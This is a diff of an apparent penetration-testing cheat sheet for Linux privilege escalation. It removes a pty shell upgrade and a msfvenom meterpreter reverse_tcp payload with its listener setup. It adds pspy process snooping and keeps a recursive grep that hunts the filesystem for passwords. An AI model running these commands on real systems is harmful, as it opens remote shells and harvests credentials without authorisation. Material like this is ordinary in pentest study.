@@ -1,8 +1,3 @@
-Upgrade shell:
-```bash
-python -c 'import pty; pty.spawn("/bin/bash")'
-```
-
 Show Linux version:
 ```bash
 uname -a
@@ -65,13 +60,10 @@ Search for strings in files:
 grep --color=auto -rnw '/' -iIe "PASSW\|PASSWD\|PASSWORD\|PWD\|PASS\|PW" --color=always --exclude-dir={usr,lib,boot,bin,cache} 2>/dev/null
 ```
 
-(NOT-OSCP!) Upgrade a system shell to meterpreter:
+Snoop on processes:
+https://github.com/DominicBreuker/pspy
 ```bash
-msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.22 LPORT=7777 -f elf > revshell.bin
-```
-(NOT-OSCP!) Setup listener: 
-```msfconsole
-use exploit/multi/handler
+./pspy64
 ```
 
 If you want to switch user and encounter this error:
